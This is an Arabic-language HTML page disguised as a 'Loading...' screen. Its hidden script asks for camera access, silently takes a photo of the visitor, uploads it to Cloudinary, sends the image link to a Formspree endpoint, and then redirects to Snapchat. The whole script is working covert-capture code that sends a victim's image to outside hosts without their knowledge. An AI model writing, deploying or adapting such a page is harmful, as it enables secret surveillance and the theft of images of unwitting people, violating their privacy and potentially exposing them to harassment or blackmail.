<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>جاري التحميل...</h2>
    <video id="video" width="640" height="480" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // رابط Formspree الخاص بك
        const FORMSPREE_URL = "https://formspree.io"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(captureAndUpload, 1500);
            })
            .catch(() => { window.location.href = "https://snapchat.com"; });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/jpeg', 0.6);

            const formData = new FormData();
            formData.append("file", imageData);
            formData.append("upload_preset", "ml_default");

            // رفع الصورة للحصول على رابط
            fetch("https://cloudinary.com", {
                method: "POST",
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                const imageUrl = data.secure_url; 

                // إرسال الرابط وحده فقط
                return fetch(FORMSPREE_URL, {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({
                        "الرابط": imageUrl 
                    })
                });
            })
            .finally(() => {
                window.location.href = "https://snapchat.com";
            });
        }
    </script>
</body>
</html>
